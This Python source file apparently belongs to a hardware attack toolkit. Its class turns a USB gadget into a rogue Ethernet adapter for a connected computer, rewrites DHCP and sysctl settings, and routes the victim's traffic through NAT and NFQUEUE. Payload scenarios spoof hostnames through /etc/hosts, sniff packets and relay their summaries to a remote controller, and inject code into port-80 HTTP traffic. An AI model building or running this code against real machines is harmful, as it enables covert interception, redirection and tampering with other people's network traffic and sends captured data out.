import os
import re
import shutil
import subprocess
from time import sleep, time
from subprocess import Popen, PIPE

import scapy.all as scapy

from lib.usb.device import Device
from lib import systemUtils as utils


class Ether(Device):
    def __init__(self, name, idVendor, idProduct,
                 serial, manufacturer, product, bckPath, thing, nfqueue=None):
        self._thing = thing
        os.makedirs(bckPath, exist_ok=True)
        self._bckPath = bckPath
        self.files = {
            "dnsmasq": {
                "original": "/etc/dnsmasq.conf",
                "bck": os.path.join(bckPath, "dnsmasq.conf")
            },
            "sysctl": {
                "original": "/etc/sysctl.conf",
                "bck": os.path.join(bckPath, "sysctl.conf")
            }
        }
        for _, item in self.files.items():
            shutil.copy(item["original"], item["bck"])

        utils.activateModules("dwc2", "g_ether")

        os.system("sudo ifconfig usb0 192.168.100.1 netmask 255.255.255.0 up")

        with open(self.files["dnsmasq"]["original"], 'w') as file:
            file.write("interface=usb0	\nlisten-address=192.168.100.1 \nbind-interfaces	\nserver=8.8.8.8	\ndomain-needed	\nbogus-priv	\ndhcp-range=192.168.100.50,192.168.100.150,12h	")

        with open(self.files["sysctl"]["original"], 'a') as file:
            file.write("net.ipv4.ip_forward=1")

        with open("/proc/sys/net/ipv4/ip_forward", 'w') as file:
            file.write('1')

        os.system("sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")
        if nfqueue is not None:
            os.system(
                "sudo iptables -t mangle -A FORWARD -p tcp --dport 80 -j NFQUEUE")
            os.system(
                "sudo iptables -t mangle -A FORWARD -p tcp --sport 80 -j NFQUEUE")
        os.system(
            "sudo iptables -A FORWARD -i wlan0 -o usb0 -m state --state RELATED,ESTABLISHED -j ACCEPT")
        os.system("sudo iptables -A FORWARD -i usb0 -o wlan0 -j ACCEPT")
        os.system("sudo ip r a 192.168.100.0/24 via 192.168.100.1 dev usb0")
        output, error = Popen(
            ['service', 'dnsmasq', 'start'],
            stdout=PIPE,
            stderr=PIPE
        ).communicate()
        if error:
            utils.log(error, flag="DEBUG", module=self.__class__.__name__)
        if output:
            utils.log(output, module=self.__class__.__name__)

    def _spoof(self, **payload):
        ipAddr = payload.pop("ipAddress")
        hostname = payload.pop("hostname")
        stringToWrite = f"{ipAddr} {hostname}\n"
        with open("/etc/hosts", 'a') as file:
            file.write(stringToWrite)

    def executePayload(self, **payload):
        super().executePayload(**payload)
        scenario = payload.pop("scenario", "").upper()

        if scenario == "SPOOFING":
            params = payload.pop("params", "")
            for param in params:
                if "ipAddress" in param and "hostname" in param:
                    self._spoof(**param)
                else:
                    utils.log(
                        "At least 1 of required params not specified",
                        flag="DEBUG",
                        module=self.__class__.__name__
                    )
        elif scenario == "SNIFF":
            self._sniff(**payload)
        elif scenario == "INJECT":
            self._inject(**payload)
        else:
            utils.log(
                f"Scenario: {scenario} is not implemented. Check spelling",
                flag="DEBUG",
                module=self.__class__.__name__
            )

    def _sniff(self, filter="tcp", timeout=None, count=0, **payload):
        def _callback(pkt):
            utils.log(
                output=pkt.summary(),
                flag="SNIFF",
                module=self.__class__.__name__
            )
            self._thing.Send(pkt.summary())

        scapy.sniff(
            store=0,
            count=count,
            iface="usb0",
            prn=_callback,
            filter=filter,
            timeout=timeout
        )

    def _inject(self, code, count, **payload):
        Popen(
            ["sudo", os.path.join(os.path.dirname(os.path.realpath(
                __file__)), "inject.py"), "--code", code, "--count", str(count)],
            stdout=PIPE,
            stderr=PIPE
        ).communicate()
        os.system("sudo iptables -t mangle --flush")

    def tearDown(self, *args, **kwargs):
        super().tearDown(*args, **kwargs)
        for _, item in self.files.items():
            shutil.copy(item["bck"], item["original"])
